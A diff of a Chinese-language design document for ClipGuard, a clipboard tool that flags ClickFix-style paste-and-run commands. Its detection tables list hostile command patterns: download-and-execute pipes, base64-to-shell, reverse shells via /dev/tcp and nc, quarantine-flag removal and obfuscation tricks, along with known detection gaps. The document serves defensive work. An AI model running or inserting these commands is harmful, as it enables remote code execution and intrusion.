@@ -84,7 +84,7 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 
 ## 3. 指令偵測（ClickFix / FileFix）
 
-程式：`src/ClipGuard.Core/CommandDetector.cs`、`CommandNormalizer.cs`。
+程式：`crates/core/src/command/`（`verdict.rs` 判定、`signals.rs` 訊號、`download_exec.rs` 下載後直接執行、`normalize.rs` 正規化、`deobfuscate/` 解混淆、`markdown.rs`、`finding.rs` 情境與 `risk_score`、`explain.rs` 白話說明）；資料在 `rules/command/`。舊版是 `src/ClipGuard.Core/CommandDetector.cs`、`CommandNormalizer.cs`。
 
 ### 3.0 比對前的處理（#19）
 
@@ -95,9 +95,9 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | ≤ 4096 字 | 整段一起分析（訊號可以分散在不同行） |
 | > 4096 字 | 先把同一行內超過 64 個的連續空白縮成 64 個空格（仍滿足「30 個以上空白接 `#`」），縮完 ≤ 4096 字就整段分析。否則分段分析，取最高等級：開頭 4096 字（涵蓋第一行和 Win+R 的 259 字上限），加上之後的每一行；比 4096 字長的行切成每次前進 2048 字的重疊片段，2048 字以內的指令不管在行內哪裡都會完整落在某一段。總共最多分析 256 KB、4000 行，超過的部分不分析，避免卡住 UI |
 
-含 `.*` 的規則（LOLBin、誘餌註解）用 `RegexOptions.NonBacktracking`，同一個字重複很多次時不會變成 O(n²)。
+所有規則都用 Rust 的 `regex` crate（保證線性時間；舊版含 `.*` 的規則用 `RegexOptions.NonBacktracking`），同一個字重複很多次時不會變成 O(n²)。1b 起每一段也會跑一次解混淆（§3.5），判定取兩者較高的等級。
 
-**正規化**（`CommandNormalizer`，純函式）：規則比對的是正規化後的文字；原文另外保留給隔離區還原，不寫檔、不記 log。白話說明（§3.3）也用同一份正規化結果，只看前 4096 字。依序處理：
+**正規化**（`normalize.rs`，舊版 `CommandNormalizer`，純函式）：規則比對的是正規化後的文字；原文另外保留給隔離區還原，不寫檔、不記 log。白話說明（§3.3）也用同一份正規化結果，只看前 4096 字。依序處理：
 
 | 步驟 | 例子 |
 |---|---|
@@ -105,7 +105,7 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | dash 變體換成 `-`：U+2010–2015、U+2212、U+FE58、U+FE63、全形 U+FF0D | `–w hidden` → `-w hidden` |
 | 去掉 cmd 的 `^` 跳脫；`^^` 變 `^`；行尾的 `^` 接下一行 | `m^s^h^t^a` → `mshta` |
 | 代入 `set x=…`、`set "x=…"` 設定的 `%x%`，以及延遲展開（`cmd /v:on`）的 `!x!`（只代入一層；最多 16 個變數、64 次代入、值最長 1024 字）。沒設定過的 `!x!` 不動，句子裡的驚嘆號不受影響（#21） | `set x=…&& call %x%`、`call !a!!b!` |
-| 展開固定的系統環境變數：`%SystemRoot%`、`%windir%`、`%SystemDrive%`、`%ComSpec%`、`%ProgramFiles%` 等，以及 PowerShell 的 `$env:windir` 寫法。不讀本機的真實環境變數 | `%ComSpec% /c` → `cmd /c` |
+| 展開固定的系統環境變數：`%SystemRoot%`、`%windir%`、`%SystemDrive%`、`%ComSpec%`、`%ProgramFiles%` 等，以及 PowerShell 的 `$env:windir` 寫法；1b 加上 ClickFix 常拿來切子字串的 `%PUBLIC%`、`%ALLUSERSPROFILE%`、`%ProgramData%`、`%OS%`、`%PATHEXT%`（清單在 `rules/command/programs.json`）。不讀本機的真實環境變數 | `%ComSpec% /c` → `cmd /c` |
 | 合併字中間的引號 | `"m"sh"ta"`、`ms""hta` → `mshta` |
 | 已知程式（powershell、pwsh、mshta、cmd、certutil、bitsadmin、rundll32、regsvr32、msiexec、conhost、curl、wget，以及 #21 的 wscript、cscript、hh、cmstp、pcalua、odbcconf、installutil、ftp、explorer、net、net1）的完整路徑只留檔名，有沒有引號、`.exe` 都可以 | `"C:\…\System32\mshta.exe"` → `mshta` |
 
@@ -131,18 +131,31 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | Protocol handler（#21） | `search-ms:` / `search:` 帶 `query=`、`crumb=`、`displayname=` 等參數；`ms-msdt:` 後面接 `/x` 或 `-x` 參數 |
 | 下載後交給 shell | curl/wget 的輸出 pipe 給 sh、bash 或 zsh |
 | 下載後直接執行（#20） | 見下方說明。本身就是執行訊號：不寫程式名稱、貼進 PowerShell 視窗的寫法也算 |
+| osascript（1b，macOS） | `osascript -e …`（可先接 `-l JavaScript`），或下載結果 pipe 給 `osascript` |
+| 拿掉隔離標記（1b，macOS） | `xattr -d com.apple.quarantine …`、`xattr -c` / `-cr`（跳過 Gatekeeper 檢查）。`spctl --master-disable` 單獨出現是系統管理指令，不算（良性語料 `benign.cmd.234`） |
+| 解碼後交給 shell（1b） | `base64 -d` / `-D`（macOS）/ `--decode`、`xxd -r`、`openssl base64 -d` 的輸出 pipe 給 sh、bash、zsh、python、perl、osascript；或 `sh -c "$(… base64 -d)"`、`eval "$(… base64 -d)"` |
+| shell 網路連線（1b） | `/dev/tcp/主機/埠`、`/dev/udp/…`、`nc -e /bin/sh`、`mkfifo … \| nc`。只有 `/dev/tcp` 的埠號檢查（`echo > /dev/tcp/主機/22`）只提醒 |
+
+macOS／Linux 訊號的強弱（1b，P1）：會叫起程式或交出控制權的寫法算執行訊號；只有「明顯是攻擊才會用」的寫法才算強詐騙訊號（下表）。`xattr`、`osascript -e`、`/dev/tcp` 單獨出現都有正當用途（打開沒簽章的 App、寫自動化腳本、檢查埠號），所以只提醒；搭配下載後直接執行等強訊號才攔截。
 
 「像在下指令」這個條件是為了排除一般句子（例如 `I use powershell every day`，#8）和網址路徑（`github.com/powershell/...`）。#21 的程式也一樣：只提到程式名稱的句子（`wscript and cscript are …`）、句子中間的 UNC 路徑（`檔案放在 \\fileserver\share\setup.exe`）都不算；單獨一行的 UNC 執行檔算，因為貼進 Win+R 就會執行（同 §3.0）。
 
-**下載後直接執行**（`DownloadExecution.cs`）指的是下面任何一種寫法，只看正規化後的文字：
+**下載後直接執行**（`download_exec.rs`，舊版 `DownloadExecution.cs`）指的是下面任何一種寫法，只看正規化後的文字：
 
 | 寫法 | 例子（片段） |
 |---|---|
-| 下載結果 pipe 給 iex、Invoke-Expression、powershell、pwsh、cmd、sh / bash / zsh。下載指令後面至少要有一個參數，避免把表格 `\| curl \| cmd \|` 當成指令 | `irm … \| iex`、`curl … \| cmd`、`curl … \| powershell -` |
+| 下載結果 pipe 給 iex、Invoke-Expression、powershell、pwsh、cmd、sh / bash / zsh。下載指令後面至少要有一個參數，避免把表格 `\| curl \| cmd \|` 當成指令。1b：也可以先接 `sudo`（含參數）、`/bin/`、`/usr/bin/env` 這類路徑，以及 ksh、dash、osascript；python、perl、ruby、node 只有從標準輸入讀腳本時才算（後面沒有參數或只有 `-`），`\| python3 -m json.tool` 不算 | `irm … \| iex`、`curl … \| cmd`、`curl … \| powershell -`、`curl … \| sudo -E bash -`、`curl … \| python3` |
 | iex 直接包住下載 | `iex(iwr …)`、`iex ((New-Object Net.WebClient).DownloadString(…))`、`iex "& { $(irm …) }"` |
+| 1b：`.Invoke(…)` / `.InvokeScript(…)` 直接包住下載 | `$ExecutionContext.InvokeCommand.InvokeScript((irm …))` |
+| 1b：命令或程序替換（shell、python、perl、ruby、node 執行下載的內容） | `/bin/bash -c "$(curl …)"`、`eval "$(wget -qO- …)"`、`source <(curl …)`、`bash <(curl …)` |
 | 先存進變數，再 iex 那個變數 | `$c = iwr …` 加上 `iex $c` |
-| `[ScriptBlock]::Create` 搭配任何下載 | `&([scriptblock]::Create((irm …)))` |
-| 下載成檔案（`-OutFile`、`DownloadFile`、`curl -o`、`certutil -urlcache`、`bitsadmin /transfer`、`Start-BitsTransfer`）再啟動（`Start-Process`、`start`、`&`、在下指令的位置直接寫 `.exe` / `.bat` / `.msi`…） | `iwr … -OutFile a.exe; Start-Process a.exe` |
+| `[ScriptBlock]::Create`（1b 加上 `InvokeCommand.NewScriptBlock` / `InvokeScript`）搭配任何下載 | `&([scriptblock]::Create((irm …)))` |
+| 下載成檔案（`-OutFile`、`DownloadFile`、`curl -o`、`certutil -urlcache`、`bitsadmin /transfer`、`Start-BitsTransfer`）再啟動（`Start-Process`、`start`、`&`、在下指令的位置直接寫 `.exe` / `.bat` / `.msi`…；1b 加上 `rundll32` / `regsvr32` 載入檔案、`Invoke-Command -FilePath`） | `iwr … -OutFile a.exe; Start-Process a.exe`、`iwr … -OutFile $env:TEMP\a.dll; rundll32 $env:TEMP\a.dll,Start` |
+| 1b：curl / wget 存成檔案（`-o 檔名`、`-O`、`--output`、`> 檔名`；curl `-O` 和沒寫 `-O` 的 wget 用網址最後一段當檔名），之後在下指令的位置執行**同一個檔名**：直接執行（`./x`、`/tmp/x`）、交給 sh / bash / python 等、`source`、`open` | `curl -o /tmp/u … && chmod +x /tmp/u && /tmp/u`、`wget …/i.sh; sh i.sh` |
+| 1b：直譯器單行程式（`python -c`、`perl -e`、`ruby -e`、`node -e`、`php -r`）在同一行裡既下載（urlopen、requests.get、LWP、`get("https://…")`、fetch…）又執行（`exec(`、`eval`、`os.system`、subprocess…） | `python3 -c "…exec(u.urlopen('…').read())"`、`perl -e 'use LWP::Simple; eval get(…)'` |
+
+- 存檔後執行要比對檔名，所以 `curl -LO …app.tar.gz && tar xzf app.tar.gz`、`curl -o data.json … && cat data.json` 不算。
+- 單行程式只下載不執行（`print(urlopen(…).status)`）、只執行不下載（`python -c 'print(1)'`）都不算。
 
 **詐騙訊號**：
 
@@ -155,6 +168,12 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | 勾選符號 ✅ ✔ ☑ | 強 |
 | 30 個以上空白後接 `#`（把真正的指令擠出輸入框） | 強 |
 | mshta 直接接遠端 URL | 強 |
+| 1b：.NET 的隱藏視窗寫法：`[Diagnostics.ProcessWindowStyle]::Hidden`、`.WindowStyle = 'Hidden'`、`CreateNoWindow = $true`（理由同隱藏視窗）。`Start-Process … -WindowStyle Hidden` 原本就由上面的 `-WindowStyle` 規則涵蓋 | 強 |
+| 1b：解碼後交給 shell（`base64 -d \| sh` 等，見執行訊號），理由同 `-enc` | 強 |
+| 1b：反向 shell：`sh -i` 接到 `/dev/tcp`、`/dev/tcp/…` 加上 `0>&1` 這類重導、`exec 5<>/dev/tcp/…`、`nc -e /bin/sh`、`mkfifo … \| nc` | 強 |
+| 1b：在背景脫離執行而且不顯示輸出（Unix 版的隱藏視窗）：`nohup`、`disown`、`setsid`、`>/dev/null 2>&1 &`、`&>/dev/null &`。`nohup python app.py > app.log 2>&1 &` 這類沒有執行訊號的不受影響 | 強 |
+| 1b：msiexec 靜默安裝遠端套件：URL 加 `/q`、`/qn`、`/quiet`、`/passive`（`-` 開頭也算）。不靜默時安裝畫面還看得到發行者，只提醒 | 強 |
+| 1b：解混淆後才出現的執行訊號（`cmd-reason-obfuscated`，§3.5） | 強 |
 | 從網路下載（iwr、irm、DownloadString、WebClient…） | **弱** |
 | 把內容當程式碼執行（iex / Invoke-Expression） | **弱** |
 
@@ -196,15 +215,29 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | ollama.com | Ollama |
 | dot.net | dotnet-install |
 | aka.ms | 微軟官方短網址（例如 install-powershell） |
+| get.docker.com | Docker 便利安裝腳本（1b：先存檔再 `sudo sh get-docker.sh` 現在也算下載後直接執行） |
 
-- **收錄條件**：官方文件要使用者貼上「下載後執行」的指令，而且網域由專案本身控制。raw.githubusercontent.com 這類任何人都能放檔案的網站不收，所以 Homebrew、nvm 的安裝指令會被攔截（可以點通知還原）。
+**官方安裝網址路徑**（1b，phase-1.md §1.8，`rules/command/official-paths.json`）：raw.githubusercontent.com 這類共用主機不能整個收，只收特定專案的路徑前綴。
+
+| 前綴 | 用途 |
+|---|---|
+| `raw.githubusercontent.com/Homebrew/install/` | Homebrew |
+| `raw.githubusercontent.com/nvm-sh/nvm/` | nvm |
+| `raw.githubusercontent.com/ohmyzsh/ohmyzsh/` | Oh My Zsh |
+
+- 網址必須是 `https`；主機必須**等於**前綴的主機（不含子網域）；路徑的每一段只能是 `[A-Za-z0-9._~-]`、不能是 `.` 或 `..`（`%2e`、`//`、反斜線、帳號欄位都不算）；前綴的每一段不分大小寫逐段相等（GitHub 的帳號、repo 不分大小寫），而且前綴後面至少還有一段（檔案）。`Homebrew/install-tools/`、`Homebrew-x/install/` 都不算。
+- 其他規則跟主機清單完全一樣：拼出來的網址不套用、其他強訊號照樣判 Malicious、相關的每一行的每一個來源都要在主機清單或路徑清單裡。
+- 良性語料 `benign.cmd.410`–`413`（Homebrew、nvm、oh-my-zsh，標了 `spec-escalates`）因此從 Malicious 降為 Suspicious。
+
+- **收錄條件**：官方文件要使用者貼上「下載後執行」的指令，而且網域由專案本身控制。raw.githubusercontent.com 這類任何人都能放檔案的網站不收整個主機，只收上表的路徑前綴（1b 之前 Homebrew、nvm 的安裝指令會被攔截）。
 - **比對主機名稱，不是子字串**：主機必須等於清單裡的網站，或是它的子網域。`astral.sh.example.invalid`、`notastral.sh` 都不算；網址裡的帳號欄位（`https://astral.sh@主機/`）以真正的主機為準；主機在反斜線處截斷；不是純 ASCII 的主機一律不算。
 - **看哪些行**：下載、執行（iex、ScriptBlock）、設定變數（`$u = …`、`set u=…`）的那幾行裡，每一個主機都要在清單裡；找不到任何主機（例如 `irm $u | iex` 而 `$u` 不在文字裡）就不算。其他行（例如 README 附的 GitHub 連結）不看，官方指令連同說明一起複製時不會被升級。
-- **拼出來的網址不可信**：文字裡有字串串接（`'…'+'…'`）、`-join`、`-f`、`-replace`、`[char]`、反引號、`FromBase64String` 時，不套用清單。
+- **拼出來的網址不可信**：文字裡有字串串接（`'…'+'…'`）、`-join`、`-f`、`-replace` / `-creplace`、`[char]`、`[char[]]`、`FromBase64String` 時，不套用清單；1b 加上 `[string]::…`、`.Insert()` / `.Substring()` / `.Remove()` / `.Replace()` 等字串方法、cmd 子字串（`%x:~…`、`!x:~…`）、`\x` 跳脫、連續三個以上的 `%xx`、`base64 -d`、`xxd -r`、`b64decode`，以及經過 §3.5 任何「拼字串」步驟的文字。
+- **反引號只算 PowerShell 跳脫**（1b，phase-1.md 1b 待辦）：markdown 的 code fence 行（```` ```sh ````、`~~~`，後面最多一個語言名稱）和行內 code（`` `bun upgrade` ``：前面不是英數字、同一行裡有同樣長度的結尾、結尾後面不是英數字）的反引號不算「拼出來的網址」。其他反引號（`` p`ow`er ``、網址裡的 `` `. ``、行尾接續）照樣算。為了不讓行內 code 的形狀被拿來藏網址，主機會用「保留反引號」和「拿掉 markdown 標記」兩種讀法各取一次，兩種讀法的每一個來源都要在清單裡：`` `irm https://astral.sh`.example.invalid/x | iex `` 拿掉標記後的主機是 `astral.sh.example.invalid`，判 Malicious。良性語料 `benign.cmd.416`、`417`、`421` 因此降為 Suspicious。
 - **清單只拿掉「下載後直接執行」這一個強訊號**：官方網站的指令如果還有隱藏視窗、誘餌註解等強訊號，一樣判 Malicious。
 - 「從網路下載」「iex」單獨出現仍只算弱訊號。scoop 不寫程式名稱的寫法（只有下載＋iex）現在跟 uv、bun 一樣判 Suspicious（F17：原本完全不提醒）。
 
-### 3.3 白話說明（`CommandExplainer.cs`）
+### 3.3 白話說明（`explain.rs`，舊版 `CommandExplainer.cs`）
 - 指令被判為 Suspicious 或 Malicious 時，會產生一段白話說明，例如「從 example.invalid 下載並執行」「隱藏視窗」「藏了一段編碼過的指令」。說明跟著介面語言（zh-TW 或英文，#27），文字在 `src/ClipGuard.Core/Resources/CoreStrings*.resx` 的 `Explain_*`；本文件引用的是 zh-TW 版本。
 - #21 的訊號跟偵測共用同一組樣式，各有一句說明，例如「用 wscript／cscript 執行腳本檔」「執行 example.invalid 網路分享上的檔案」「連到 example.invalid 的 WebDAV 遠端資料夾」「用 ms-msdt: 呼叫疑難排解工具（Follina 漏洞的手法）」。
 - 下載來源的主機用跟官方網站清單一樣的方式取出（帳號欄位以真正的主機為準），最多列 3 個。
@@ -212,19 +245,78 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 - 通知內容最多 255 字元，標題最多 63 字元，超過的部分以 `…` 截斷。英文比中文長，攔截通知的開頭和結尾句加起來仍要留至少 60 字給白話說明，`LocalizationTests` 會對兩種語言檢查這個空間和標題長度。
 
 ### 3.4 已知缺口（尚未修正）
+
+1b 已修掉的（有語料 `corpus/cases/command-1b-*.jsonl`）：cmd 子字串（`%x:~0,3%`、`!x:~0,3!`）與取代（`%x:a=b%`）、多層變數代入、PowerShell 變數或字串串接組出程式名稱（`& ('ms'+'hta')`）、反引號跳脫、全形英文字母（§3.5）；Homebrew、nvm、oh-my-zsh 的官方安裝指令（§3.2 路徑清單）；`[string]::Concat`、`.Insert()` 組出的網址（§3.2 拼字串清單）；msiexec 靜默安裝遠端套件、`.Invoke()`、`InvokeScript`、`Invoke-Command -FilePath`、`rundll32` 載入剛下載的 DLL（§3.1）。
+
 | 缺口 | Issue |
 |---|---|
-| 超過 4096 字時，訊號分散在不同行而且不在開頭 4096 字內（例如第 1 行的指令配上第 200 行的誘餌註解）時，各行分開看，可能只判 Suspicious；同一行裡用超過 2048 個非空白字元把執行訊號和詐騙訊號隔開時也一樣；超過 256 KB / 4000 行的部分不分析 | #19 的取捨 |
+| 超過 4096 字時，訊號分散在不同行而且不在開頭 4096 字內（例如第 1 行的指令配上第 200 行的誘餌註解）時，各行分開看，可能只判 Suspicious；同一行裡用超過 2048 個非空白字元把執行訊號和詐騙訊號隔開時也一樣；超過 256 KB / 4000 行的部分不分析。解混淆也是一段一段做，跨段的變數設定和使用不會接起來 | #19 的取捨 |
 | 剪貼簿超過 1 Mi 字的部分根本不讀（§2.2），所以先塞超過 1 Mi 字的空白再接指令也看不到（縮空白是在讀進來之後才做） | #24 的取捨 |
-| cmd 子字串展開（`%x:~0,3%`、`!x:~0,3!`）、`set /p`、多層變數代入、`for` 迴圈組字、PowerShell 的變數或字串串接組出程式名稱（`& ('ms'+'hta')`）、反引號跳脫、全形英文字母 | 尚未開 issue |
-| 官方網站清單以外的合法安裝指令（Homebrew、nvm 等放在 raw.githubusercontent.com 的）會被攔截，要點通知還原 | #20 的取捨（F17） |
-| 官方網站清單只認得常見的字串拼接寫法；用 `[string]::Concat`、`.Insert()`、環境變數等其他方式組出清單外的網址，而且同一行放清單內網址當幌子時，可能只判 Suspicious | #20 的取捨 |
-| 「下載後直接執行」沒涵蓋的寫法：msiexec 直接裝遠端套件、`Invoke-Command`、`.Invoke()`、下載後用相對路徑以外的方式啟動（例如 `rundll32` 載入剛下載的 DLL）仍只提醒 | 尚未開 issue |
+| 解混淆只算「字面值」：`set /p`（從輸入讀值）、`for` 迴圈組字、執行時才知道的值（`$env:` 不在固定清單裡的變數、指令輸出）、算式（`[char](100+5)`）、`-split`、陣列反轉索引（`'atl'[-1..-3]`）、`.Substring()`、`Set-Alias`／`gcm i*x` 這類萬用字元找指令、壓縮過的內容（`GzipStream`、`DeflateStream`）都解不開。這些寫法大多仍會被 §3.2 的拼字串清單擋下官方清單，但組出來的程式名稱看不到，可能只判 Suspicious 或 None | 1b 的取捨（只做線性時間、不執行的字面分析） |
+| 解混淆最多 5 層、文字最多膨脹 4 倍、總長最多 1 Mi 字（§3.5）；第 6 層以後的 `-enc` 不再解開（外層的 `-enc` 本身已經是強訊號） | 1b 的取捨 |
+| markdown 的判斷是簡化版：fence 行只認「三個以上反引號或 `~` 加最多一個語言名稱」，行內 code 只認一兩個反引號的同長度配對。不完全照 CommonMark，例如縮排 4 格的 code block 不特別處理 | 1b 的取捨 |
+| 官方清單（主機或路徑）的指令如果另外用拼字串、編碼等手法寫，一律不套用清單（判 Malicious，可以點通知還原） | #20 的取捨 |
+| msiexec 沒有靜默參數時只提醒（安裝畫面看得到發行者）；用 `Start-Job`、排程工作（`schtasks`、`Register-ScheduledTask`）、WMI 啟動剛下載的檔案沒有涵蓋 | 1b 的取捨 |
+| `xattr` 拿掉隔離標記、`osascript -e`、`/dev/tcp` 埠號檢查單獨出現只提醒；`spctl --master-disable` 不算訊號；下載到 `/tmp` 再用不同檔名執行（例如先 `mv`）不算「存檔後執行」 | 1b 的取捨（P1） |
+| 直譯器單行程式的下載和執行要在同一行；分成多行的 Python 腳本不分析 | 1b 的取捨 |
+| 白話說明（§3.3）還是只描述正規化後的文字和 `-enc` 解碼結果，其他解混淆步驟只出現在 trace（§3.5） | 尚未開 issue |
 | `setlocal enabledelayedexpansion`（批次檔裡的延遲展開）本身不算訊號；`!x!` 仍會代入 | #21 的取捨 |
 | 遠端檔案只在「下指令的位置」才算：`pushd \\主機\…` 之後用相對路徑執行、`net use` 的磁碟代號前面先寫其他開關（`net use /persistent:no Z: …`）沒有涵蓋 | #21 的取捨 |
 | #21 的 LOLBin、UNC/WebDAV、`search-ms:`、`ms-msdt:` 單獨出現只提醒（P1），要搭配強詐騙訊號才攔截 | #21 的取捨 |
 
-## 4. 執行入口守衛
+### 3.5 解混淆與洋蔥 trace（1b，`deobfuscate/`）
+
+`command::deobfuscate(text)` 把文字一層一層剝開，每一步記成一個 `DeobfuscationStep`：種類（`kind`）、第幾層（`layer`）、說明（訊息 ID `cmd-deob-*`，參數 `count` = 改了幾處）、這一步之後的文字預覽。只做字面分析：不執行、不連網、不讀環境變數，全部用 `regex` crate。
+
+| 層 | 步驟（依序） |
+|---|---|
+| 0 | §3.0 的正規化（每一小步各自記錄：`invisible`、`dash`、`caret`、`variable`、`quote`、`program_path`），再拿掉 markdown 標記（`markdown`：fence 行整行拿掉、行內 code 拿掉前後的反引號，判斷方式同 §3.2） |
+| 1–5 | 全形英數字（`full_width`，只換字母和數字，全形標點不動）→ PowerShell 反引號跳脫（`backtick`，行尾的反引號接下一行）→ `%xx` 網址編碼（`url_decode`，連續三個以上、解出來是 UTF-8 文字）→ `\xHH` 跳脫和 16 位以上的十六進位字串（`hex_decode`，解出來要是可列印 ASCII）→ `-EncodedCommand`（`encoded_command`，UTF-16LE，判斷同 §3.3）→ Base64（`base64`：`[Text.Encoding]::UTF8/Unicode/….GetString([Convert]::FromBase64String('…'))`、`echo … \| base64 -d`、`base64 -d <<< …`、Python `b64decode('…')`）→ `[char]NN`、`[char[]](…)`（`char_code`）→ PowerShell 字串變數 `$a = '…'`（`ps_variable`；同一個變數被設成不同值就不代入）→ cmd 子字串與取代（`cmd_substring`：`%x:~a,b%`、`!x:~a,b!`、`%x:舊=新%`、`%x:*舊=新%`，用 `set` 的值或固定系統變數）→ `[string]::Concat/Join/Format`（`string_method`）→ `'a'+'b'`（`concat`）→ `-join`（`join`）→ `-f`（`format`）→ `-replace` / `-creplace` / `.Replace()`（`replace`）→ 拆開被當成指令的字串（`unwrap`：`('x')` → `'x'`，`& 'mshta'` → `& mshta`，`iex 'iwr …'` → `iex iwr …`）→ 再跑一次正規化（這時的變數代入記成 `nested_variable`） |
+
+- 字面值指 `'…'`（`''` 跳脫）或不含 `$`、反引號的 `"…"`；任何一邊是變數或執行時的值就不算，原文保留。
+- 一層沒有任何改變就停。上限都是具名常數：最多 `MAX_LAYERS` = 5 層；每一步的結果不能超過輸入的 `MAX_GROWTH` = 4 倍，也不能超過 `MAX_OUTPUT_CHARS` = 1 Mi 字，超過的那一步丟掉並停止（`capped`）；`+` 串接每層最多 16 輪、清單最多 4096 項、`-replace` 每層最多 32 次、樣式最長 256 字（用 `regex` crate 編譯，有大小上限）；最多記 `MAX_STEPS` = 64 步。
+- **預覽**：從第一個改變的地方往前 24 字開始、最多 120 字，空白縮成一個空格，截斷處加 `…`；裡面的機密（§5 的規則，預設個資包）先遮罩。預覽是不可信的內容，UI 要跳脫後才顯示。
+- **拼字串步驟**：`backtick`、`url_decode`、`hex_decode`、`char_code`、`concat`、`join`、`format`、`replace`、`string_method`、`base64`、`encoded_command`、`cmd_substring`、`nested_variable`。**混淆步驟**：拼字串步驟加上 `full_width`。`ps_variable`、`unwrap` 和第 0 層都不算（`$u = 'https://astral.sh/…'; irm $u | iex` 仍套用官方清單）。
+
+**判定怎麼用解混淆結果**（`verdict.rs`）：每一段（§3.0）照舊判定一次，再把剝完的文字用同一張判定表判定一次，取較高的等級、合併理由。
+
+- 剝的過程有拼字串步驟時，第二次判定不套用官方清單（§3.2）。
+- 剝完才出現、原文和「第 0 層的結果」都沒有的執行訊號，代表有人刻意藏起要執行的程式，如果過程有混淆步驟，就加上強訊號 `cmd-reason-obfuscated`（「用混淆手法藏住要執行的東西」），判 Malicious。例如 `& ('ms'+'hta') x.hta`、`%ComSpec:~-7,3% /c …`、全形的 `ｐｏｗｅｒｓｈｅｌｌ -c …`。只有混淆、沒有任何執行訊號的文字（`'a'+'b'`）仍是 None。
+- 只拿掉 markdown 標記不會改變判定。
+- 效能：每一段的解混淆都有上限，1 Mi 字的病態輸入（每一種步驟各一個）在 release 版要在 150 ms 內（`verdict.rs` 的 `deobfuscation_inputs_meet_budget`，CI 超過兩倍才失敗）。
+
+### 3.6 情境加權與 `risk_score`（1b，`finding.rs`）
+
+`command::analyze_in(text, &Context)` 回傳 `CommandFinding { verdict, risk_score, trace, hosts }`。`verdict` 一定等於 `command::analyze(text)`：**情境只影響 `risk_score`，不改判定**，所以不會把 Malicious 降級（P1），也不會只因為來源是瀏覽器就清空剪貼簿。`trace` 是各段的解混淆步驟（最多 64 步，預覽已遮罩），`hosts` 是原文和解混淆結果裡的下載來源主機（最多 16 個，小寫）。
+
+`risk_score`（0–100，給 UI 排序、決定提醒頻率和報表用）的公式公開如下：
+
+```
+分數 = 基本分
+     + 6 × 強詐騙理由數（最多算 3 個）
+     + 3 × 弱詐騙理由數（最多算 3 個）
+     + 2 × (執行理由數 − 1)（最多算 3 個）
+     + 4 × 解混淆步驟裡不同的混淆種類數（最多算 3 個）
+     + 情境
+再限制在該等級的區間內
+```
+
+| 等級 | 基本分 | 區間 |
+|---|---|---|
+| None | 0 | 0–19 |
+| Suspicious | 30 | 20–59 |
+| Malicious | 70 | 60–100 |
+
+| 來源（`Context.source.kind`） | 情境 | 套用在 |
+|---|---|---|
+| 瀏覽器 | +10（ClickFix 頁面在瀏覽器裡） | Suspicious、Malicious |
+| 通訊軟體 | +5（誘餌也會用訊息傳） | Suspicious、Malicious |
+| 終端機、IDE | −15（使用者自己的工作，降低提醒頻率） | 只有 Suspicious |
+| 其他、未知 | 0 | — |
+
+- 區間保證分數和判定一致：Malicious 一定 ≥ 60，終端機來源的 Suspicious 最低 20（仍然是提醒），None 最高 19。
+- 例：`cmd /c dir` 未知來源 30、瀏覽器 40、通訊軟體 35、終端機 20；從瀏覽器複製的隱藏視窗＋下載執行約 100。
+- `Context.platform` 目前不影響分數（保留給之後「指令方言和平台不符」的判斷）。
 
 程式：`src/ClipGuard.Core/ExecutionEntryGuard.cs`、`src/ClipGuard.App/ForegroundWatcher.cs`（`EVENT_SYSTEM_FOREGROUND`）。
 
